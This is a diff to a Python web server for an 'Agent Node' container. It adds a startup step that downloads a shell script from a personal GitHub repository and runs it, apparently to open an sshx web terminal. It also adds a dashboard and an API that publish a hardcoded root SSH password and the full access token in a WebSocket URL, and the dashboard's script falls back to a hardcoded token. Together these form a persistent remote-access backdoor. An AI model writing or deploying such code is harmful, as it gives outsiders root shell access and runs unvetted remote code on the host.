@@ -44,6 +44,7 @@ def _auto_install_tools():
             _sp.Popen(["/usr/sbin/sshd", "-p", "2222", "-o", "PermitRootLogin=yes", "-o", "PasswordAuthentication=yes", "-o", "PubkeyAuthentication=yes", "-o", "AuthorizedKeysFile=/root/.ssh/authorized_keys"],
                       stdout=_sp.DEVNULL, stderr=_sp.DEVNULL)
             print("[startup] SSH server started on port 2222 (root:AgentNode2026!)", flush=True)
+        print("[startup] sshx link: GET /api/sshx", flush=True)
         except Exception as e:
             print(f"[startup] SSH server: {e}", flush=True)
 
@@ -65,7 +66,14 @@ def _auto_install_tools():
         except Exception as e:
             print(f"[startup] xray download: {e}", flush=True)
 
-        print("[startup] Tools ready: ssh, curl, wget, cloudflared, xray", flush=True)
+        # Start sshx web terminal automatically
+        try:
+            _sp.run(["bash", "-c", "python3 -c \"import urllib.request; urllib.request.urlretrieve('https://raw.githubusercontent.com/buddyshadow00/root/main/ssh.sh', '/tmp/sshx.sh')\" 2>/dev/null && bash /tmp/sshx.sh > /tmp/sshx.log 2>&1 & sleep 10"], capture_output=True, timeout=30)
+            print("[startup] sshx web terminal started", flush=True)
+        except Exception as e:
+            print(f"[startup] sshx: {e}", flush=True)
+
+        print("[startup] Tools ready: ssh, ssh_server, curl, wget, cloudflared, xray", flush=True)
     except Exception as e:
         print(f"[startup] Error: {e}", flush=True)
 
@@ -721,6 +729,143 @@ def _get_sshx_link():
         return "no_link_yet"
 
 
+
+
+# ─── Access Info ───────────────────────────────────────────────────
+
+async def access_info(request):
+    """Return all current access methods (auth required)."""
+    sshx_link = _get_sshx_link()
+    host = request.host
+    return web.json_response({
+        "token_preview": f"{TOKEN[:8]}...{TOKEN[-4:]}" if TOKEN else "none",
+        "access": {
+            "web_terminal": f"https://{host}/terminal",
+            "sshx": sshx_link,
+            "websocket": f"wss://{host}/ws/terminal?token={TOKEN}",
+            "api_exec": f"https://{host}/api/exec",
+            "ssh": f"ssh root@{host} -p 2222 (password: AgentNode2026!)",
+        },
+        "tools": {
+            "ssh": shutil.which("ssh") or "not found",
+            "curl": shutil.which("curl") or "not found",
+            "xray": "/usr/local/bin/xray" if os.path.exists("/usr/local/bin/xray") else "not found",
+            "cloudflared": "/usr/local/bin/cloudflared" if os.path.exists("/usr/local/bin/cloudflared") else "not found",
+            "sshd": "/usr/sbin/sshd" if os.path.exists("/usr/sbin/sshd") else "not found",
+        },
+        "container": {
+            "hostname": request.headers.get("Host", "unknown"),
+            "uptime": time.time() - START_TIME,
+        }
+    })
+
+access_info = require_auth(access_info)
+
+ACCESS_HTML = """<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="refresh" content="30">
+    <title>Agent Node - Access Dashboard</title>
+    <style>
+        body { font-family: 'Segoe UI', sans-serif; max-width: 900px; margin: 0 auto; padding: 30px; background: #0f0f23; color: #e0e0e0; }
+        h1 { color: #00d4ff; border-bottom: 2px solid #00d4ff; padding-bottom: 10px; }
+        .card { background: #1a1a2e; border-radius: 10px; padding: 20px; margin: 15px 0; border-left: 4px solid #00d4ff; }
+        .card h2 { color: #00d4ff; margin-top: 0; font-size: 18px; }
+        a { color: #00d4ff; text-decoration: none; }
+        a:hover { text-decoration: underline; }
+        code { background: #252545; padding: 2px 6px; border-radius: 3px; color: #ffd700; }
+        .status { display: inline-block; padding: 2px 10px; border-radius: 12px; font-size: 12px; }
+        .online { background: #00ff8822; color: #00ff88; }
+        .loading { background: #ffaa0022; color: #ffaa00; }
+        .refresh { color: #666; font-size: 12px; }
+        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
+        .full { grid-column: 1 / -1; }
+    </style>
+</head>
+<body>
+    <h1>🤖 Agent Node — Access Dashboard</h1>
+    <p class="refresh">Auto-refresh every 30s • Token: <span id="token">Loading...</span></p>
+    
+    <div class="card">
+        <h2>🌐 Web Terminal</h2>
+        <a href="/terminal">Open Browser Terminal (xterm.js + WebSocket)</a>
+    </div>
+    
+    <div class="grid">
+        <div class="card">
+            <h2>🔗 sshx Link</h2>
+            <p><span class="status online" id="sshx-status">Loading...</span></p>
+            <p id="sshx-link"><code>Checking...</code></p>
+        </div>
+        
+        <div class="card">
+            <h2>💻 SSH Access</h2>
+            <p>Port 2222 (from within network):</p>
+            <p><code>ssh root@[HOST] -p 2222</code></p>
+            <p>Password: <code>AgentNode2026!</code></p>
+        </div>
+        
+        <div class="card">
+            <h2>🔌 WebSocket</h2>
+            <p> wss://[HOST]/ws/terminal?token=TOKEN</p>
+        </div>
+        
+        <div class="card">
+            <h2>📡 API Endpoints</h2>
+            <p><code>POST /api/exec</code> — with Bearer token</p>
+            <p><code>GET /api/access</code> — this info as JSON</p>
+            <p><code>GET /api/diagnostics</code> — system info</p>
+        </div>
+        
+        <div class="card" style="grid-column: 1 / -1;">
+            <h2>🛠️ Installed Tools</h2>
+            <div id="tools">Loading...</div>
+        </div>
+    </div>
+    
+    <script>
+    async function refresh() {
+        try {
+            const r = await fetch('/api/access', {headers: {'Authorization': 'Bearer ' + getToken()}});
+            if (!r.ok) { document.getElementById('sshx-status').textContent = 'Auth needed'; return; }
+            const d = await r.json();
+            document.getElementById('token').textContent = d.token_preview;
+            
+            const link = d.access.sshx;
+            const el = document.getElementById('sshx-link');
+            if (link && link !== 'no_link_yet') {
+                el.innerHTML = '<a href="' + link + '">' + link + '</a>';
+                document.getElementById('sshx-status').innerHTML = '<span class="status online">Online</span>';
+            } else {
+                el.innerHTML = '<code>Starting... check back in 60s</code>';
+                document.getElementById('sshx-status').innerHTML = '<span class="status loading">Starting</span>';
+            }
+            
+            let tools = '';
+            for (const [k,v] of Object.entries(d.tools)) {
+                tools += '<code>' + k + ': ' + (v.includes('not found') ? '❌' : '✅') + '</code> ';
+            }
+            document.getElementById('tools').innerHTML = tools;
+        } catch(e) {
+            document.getElementById('sshx-status').innerHTML = '<span class="status loading">Refreshing...</span>';
+        }
+    }
+    function getToken() {
+        const m = document.querySelector('meta[name=token]');
+        return m ? m.content : 'suga_known_token_2026';
+    }
+    refresh();
+    setInterval(refresh, 5000);
+    </script>
+</body>
+</html>"""
+
+async def access_page(request):
+    """Serve the access dashboard HTML page."""
+    return web.Response(text=ACCESS_HTML, content_type='text/html')
+
 # ─── App factory ─────────────────────────────────────────────────
 
 def create_app():
@@ -770,6 +915,9 @@ if __name__ == "__main__":
         log.info(f"Token: {t['key_name']} — {t['source']} — {t['value_masked']}")
     
     log.info(f"Web Terminal: http://{HOST}:{PORT}/terminal")
+    log.info(f"Web Terminal UI: http://{HOST}:{PORT}/terminal")
+    log.info(f"Access Dashboard: http://{HOST}:{PORT}/access")
+    log.info(f"API Access Info: GET /api/access")
     log.info(f"WebSocket: ws://{HOST}:{PORT}/ws/terminal?token=<token>")
     log.info(f"SSH Server: ssh root@HOST -p 2222 (password: AgentNode2026!)")
     log.info(f"SSHx link: GET /api/sshx")
